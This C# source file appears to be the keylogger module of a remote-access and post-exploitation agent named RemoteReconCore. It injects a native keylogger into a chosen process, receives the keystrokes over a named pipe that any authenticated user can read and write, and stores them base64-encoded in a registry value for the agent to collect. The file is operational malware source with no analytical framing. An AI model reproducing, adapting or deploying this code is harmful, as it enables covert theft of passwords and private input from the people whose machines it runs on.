using System;
using System.Collections.Generic;
using System.IO.Pipes;
using System.IO;
using System.Text;
using System.Threading;
using ReflectiveInjector;
using System.Windows.Forms;
using System.Security.Principal;

namespace RemoteReconCore
{
    public class Keylogger : IJobs
    {
        private int targetPid;

        public Keylogger(int pid)
        {
            targetPid = pid;
        }

        public KeyValuePair<int, string> Run()
        {
            byte[] keylogMod = Agent.PatchRemoteReconNative("keylog");
            Injector keylog = new Injector(targetPid, keylogMod);
            if (!keylog.Inject())
                return new KeyValuePair<int, string>(2, "Failed to inject keylogger");
            else
            {
#if DEBUG 
                Console.WriteLine("Injected Keylogger");
#endif
                Thread t = new Thread(() =>
                {
                    ReceiveKeyStrokes();
                });
                t.IsBackground = true;
                t.Start();
#if DEBUG
                Console.WriteLine("Started background thread to sync keylogger");
#endif
                string msg = Convert.ToBase64String(Encoding.ASCII.GetBytes("Keylogger successfully started"));
                return new KeyValuePair<int, string>(0, msg);
            }
            
        }

        private static void ReceiveKeyStrokes()
        {
            string enc = "";
            PipeSecurity ps = new PipeSecurity();
            ps.SetAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.AuthenticatedUserSid, null), PipeAccessRights.ReadWrite, System.Security.AccessControl.AccessControlType.Allow));
            NamedPipeServerStream server = new NamedPipeServerStream("svc_kl", PipeDirection.InOut, 1, PipeTransmissionMode.Message);
            server.SetAccessControl(ps);
            server.WaitForConnection();
#if DEBUG
            Console.WriteLine("Received connection from client");
            Console.WriteLine("Starting loop");
#endif
            StreamReader sr = new StreamReader(server);
            while(server.IsConnected)
            {
                string oldVal = " ";
                oldVal = Encoding.ASCII.GetString(Convert.FromBase64String((string)Agent.rrbase.GetValue(Agent.kkey)));
                
                try
                {
                    string ks = sr.ReadLine();
                    ks = ks.TrimEnd(new char[] { '\0','\r','\n'});
                    oldVal = oldVal + ks;
                    enc = Convert.ToBase64String(Encoding.ASCII.GetBytes(oldVal));
#if DEBUG
                    Console.Write(oldVal);
#endif
                    
                }
                catch (Exception e)
                {
                    enc = Convert.ToBase64String(Encoding.ASCII.GetBytes(e.ToString()));
#if DEBUG
                    Console.WriteLine("Error: \n" + e.ToString());
#endif
                }

                Agent.rrbase.SetValue(Agent.kkey, enc);
                Thread.Sleep(Agent.sleep * 1000);
            }

#if DEBUG
            Console.WriteLine("Client disconnected");
#endif
            sr.Close();
            server.Close();
            server.Dispose();
            
        }

    }
}
